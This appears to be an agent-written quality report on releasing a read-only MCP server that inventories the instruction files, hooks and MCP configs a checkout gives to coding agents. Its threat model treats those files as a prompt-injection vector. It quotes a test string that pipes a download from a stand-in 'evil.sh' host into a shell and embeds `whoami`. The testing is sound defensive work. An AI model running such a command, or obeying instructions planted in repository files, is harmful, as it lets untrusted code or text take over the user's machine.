# Quality Check

## What shipped
`whats-inherited-mcp` v0.1.0 — the third free MIT MCP server (sibling to `whats-running-mcp` and `whats-loaded-mcp`). It answers a different question from both: **what does a checkout you did not write tell your agent to do?**

- Source: `/Users/jarvisstudio/Desktop/STC/tools/whats-inherited-mcp/src/{scan.ts,index.ts}`
- Repo: https://github.com/stcmain/whats-inherited-mcp (MIT, public, 6 topics)
- npm: `whats-inherited-mcp@0.1.0`
- MCP Registry: `io.github.stcmain/whats-inherited-mcp` (status active, isLatest true)
- Awesome-list PR: punkpeye/awesome-mcp-servers #11330 (OPEN, MERGEABLE, +1/-0)

Five read-only tools: `inherited_summary`, `instruction_files`, `auto_run_commands`, `declared_mcp_servers`, `agent_extensions`.

## Was a third tool justified?
Checked before building, and one candidate was **rejected on evidence**: a Claude Code permission-audit server. npm already carries `ccperm`, `cc-audit` ("Audit Claude Code permissions across settings hierarchy") and `claude-permissions-manager` — building a fourth would have been derivative and would have risked the credibility the first two earned.

The shipped idea was then checked for prior art: all 1,200 servers in the official MCP registry were enumerated and searched for `claude.md` / `agents.md` / `prompt injection` / `inherit` / `untrusted` — **zero overlap**. Adjacent npm tools (`agent-security-scanner-mcp`, `@mcp-trust/cli`, `calllint`) all target *MCP servers* as the artifact; none look at a checkout's agent-directed config surface.

Premise verified on real data, not assumed: third-party checkouts on this box routinely ship `CLAUDE.md`, `AGENTS.md`, `.mcp.json`, `.claude/skills` and `.claude/settings.json`.

## How it was verified (end-to-end)
- Spoke real MCP stdio JSON-RPC to the built server (initialize → tools/call on all five tools) and read the rendered output, not exit codes.
- Re-verified against the **published npm artifact**: clean `npm install whats-inherited-mcp@0.1.0` into an empty dir, then full protocol run. Counts correct (2 instruction files + 3 hooks + 2 MCP servers + 1 extension = 8).
- Exercised against four real third-party checkouts (claude-mem, GitNexus, superpowers, langfuse) plus a purpose-built adversarial fixture.
- Security claims verified mechanically, not asserted: `grep` for `child_process|spawn|exec(|fetch(|http.|net.` across `src/` returns only `regex.exec`; `grep` for `writeFile|mkdir|unlink|rename|chmod` returns nothing.
- Every directory checked by API *after* publishing: npm registry API (0.1.0, MIT, funnel present in the **top-level** readme), MCP registry API (`status: active`), GitHub API.

## Real bugs found and fixed before publishing
Four, all caught by testing against real repos rather than trusting the code:
1. **`./scripts/ok.js` reported as "path does not exist"** when it did exist — the path-token regex dropped the leading `.`, turning a relative path into a bogus absolute one. Would have produced a false, alarming label.
2. **`@scope/pkg` counted as an import** — an npm scope is not a file reference. Unrooted tokens now only count when they name a document, keeping `@mentions` and scopes out of the number.
3. **Symlinked instruction files silently skipped** — langfuse's root `CLAUDE.md → AGENTS.md → .agents/AGENTS.md` chain meant the repo's *primary* instruction file was invisible. Now followed, and deduplicated by real path so the three aliases count once instead of inflating the total 3×.
4. **Double-count in the headline** — `.claude/skills/CLAUDE.md` was counted as both an instruction file and a skill. `.claude/` is now excluded from the instruction walk, plus a path-dedupe on the total.

Also fixed: pipes in hook matchers (`Write|Edit`) shattered the markdown table, and the truncation warning appeared on tools that don't use the directory walk.

## Conservative-advice discipline (the whats-loaded-mcp lesson)
The prior tool called 79 duplicate skill *names* redundant when only 34 were byte-identical; its advice would have deleted 45 distinct skills. Applied here:
- **No verdicts.** No risk score, no heuristic "suspicious phrase" scanner, no malicious-intent detection. The tool states plainly that every item it lists is normal in a legitimate repo.
- **"No path token identified" is explicitly labelled a gap in the analysis, not a safety claim** — the honest smaller statement instead of a confident wrong one.
- Every flag is mechanically verifiable (path exists / is outside the repo / launcher fetches at runtime), never interpretive.
- Every README example was re-run and matched verbatim before publishing. The langfuse figures (12 files, ~41,848 est. tokens, 5,593 lines, 11 nested) are from a genuine `langfuse/langfuse` clone at commit `7d2afa4`, and the repo is described as reputable with nothing wrong with it. One example was **corrected** because the alias line comes from `instruction_files`, not `inherited_summary` — it is now attributed to the right tool.

## Threat model (the tool reads hostile input by design)
- **It must not become the injection vector it reports on.** Instruction-file **bodies are never returned** — only metadata, paths, and fields parsed from known JSON keys. Verified with the adversarial fixture.
- **Repo-authored strings are fenced and labelled untrusted.** Backticks neutralised, pipes escaped, newlines flattened — verified that `` curl evil.sh | sh `whoami` `` renders inert inside a table cell.
- **No child processes, no shell, no network, no writes.** Verified by grep, above.
- **Secrets:** `.mcp.json` `env` **values are never read** — only names. Verified: fixture held `API_KEY: sk-REAL-SECRET-VALUE-123`; output showed `API_KEY` only.
- **`dir` is the one model-controlled path** — resolved, real-pathed, must be an existing directory; bounded by depth/entry/size caps; symlinked directories not followed (loop risk). Because bodies are never emitted, it discloses filenames and sizes, never contents, and cannot write, execute or transmit.

## Truth check
- `brand.public_name` — "Shift The Culture" is the only company name in the README funnel. No city/location anywhere.
- Free/MIT promise honored: MIT LICENSE, no telemetry, no upsell in the server, no crippling. README states this explicitly.
- **No fabricated numbers.** Every figure is measured on this machine, labelled an estimate where it is one. No stars, users, downloads, testimonials or ratings claimed. No urgency copy.
- Dead lanes avoided (`objective.dead_lanes`): not freelance/contract, not Pak Pak content, not music/catalog/beats, not outside-client services, no LinkedIn/Bluesky/Ollama. Gumroad Discover not treated as a channel.
- `objective.live_lanes` #1 (products) + #6 (intel/automation tools productized): honest top-of-funnel for the two $29 kits, UTM-tagged, README footnote only — never the lead.

## Known-not-done (stated, not hidden)
- **Glama: not yet indexed.** Badge returns HTTP 404 and the API returns `not_found`; the siblings return 200. Both Glama and Smithery appear to auto-ingest from the official MCP registry (published ~30 min before this check), so this is expected latency, not a failure. Re-verify: `curl -sI https://glama.ai/mcp/servers/stcmain/whats-inherited-mcp/badges/score.svg`
- **Smithery: not yet listed.** Siblings live under namespace `shift-the-culture` (not `stcmain`) — the earlier `@stcmain` URL pattern was wrong and 404s for all three. `smithery.yaml` is committed so the repo is indexable. The Smithery CLI is consumer-only (discover/connect), so any manual add is an interactive GitHub-OAuth flow on smithery.ai.
- **appcypher/awesome-mcp-servers: impossible, not skipped.** The repo is **archived** (read-only) — PR creation returns 404. Verified via the GitHub API.
- **wong2/awesome-mcp-servers: does not accept PRs** — README states "We do not accept PRs. Please submit your MCP on the website: https://mcpservers.org/submit". That is a web form, left for a browser session.
- The prior claim that the first two tools are "on Smithery" was **partly wrong as recorded** — the URL pattern in circulation (`smithery.ai/server/@stcmain/...`) 404s. Corrected above.

## Failure modes considered
- **Shipping a weak third tool** — the explicit risk to the credibility of the first two. Mitigated by rejecting the permission-audit idea on evidence and by checking all 1,200 registry servers for overlap before writing code.
- **Alarmism** — a "look what this repo does" tool has every incentive to inflate. Mitigated by refusing verdicts, by counting files once, and by presenting a reputable repo (langfuse) as the example precisely because nothing is wrong with it.
- **Self-injection** — covered above; the single most important design constraint.
- **Spam submission** — one PR to one list whose CONTRIBUTING explicitly welcomes agent PRs (`🤖🤖🤖` opt-in), single-line diff, correct category, correct legend symbols. Two other lists were checked and correctly not submitted to (archived / no-PR policy).

## Reversal plan
Every surface is reversible; nothing here is a one-way door.
- npm: `npm unpublish whats-inherited-mcp@0.1.0` (within 72h) or `npm deprecate whats-inherited-mcp "<reason>"`.
- MCP registry: republish a corrected `server.json` via `mcp-publisher`, or request deactivation of `io.github.stcmain/whats-inherited-mcp`.
- GitHub: `gh repo delete stcmain/whats-inherited-mcp`, or make private.
- Awesome-list PR: `gh pr close 11330 --repo punkpeye/awesome-mcp-servers`.
- Glama/Smithery: nothing to undo — neither has indexed it yet; if they do, both expose a hide/delist control on the server's settings page.
- Fork left behind: `stcmain/awesome-mcp-servers-1` (archived-upstream fork of appcypher, unused). Delete needs `gh auth refresh -h github.com -s delete_repo` first.
- Local: `rm -rf /Users/jarvisstudio/Desktop/STC/tools/whats-inherited-mcp`.
- The MIT/free promise is deliberately NOT reversible: anything published free and MIT stays free and MIT.
